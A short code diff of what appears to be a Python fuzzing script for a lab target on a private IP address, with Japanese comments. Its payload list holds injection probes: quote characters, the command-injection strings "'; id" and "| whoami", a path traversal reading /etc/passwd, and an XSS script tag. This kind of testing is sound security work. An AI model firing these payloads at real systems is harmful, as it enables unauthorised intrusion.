@@ -7,13 +7,14 @@ url = "http://192.168.56.109/kzMb5nVYJw/420search.php"
 # 検証したいペイロード（攻撃コード）のリスト
 payloads = [
     "'",
+    '"',
     "'; id",
     "| whoami",
     "../../../../etc/passwd",
     "<script>alert(1)</script>"
 ]
 
-print("検証を開始します！")
+print("検証開始")
 
 for payload in payloads:
     # URLパラメータ（クエリストリング）を設定
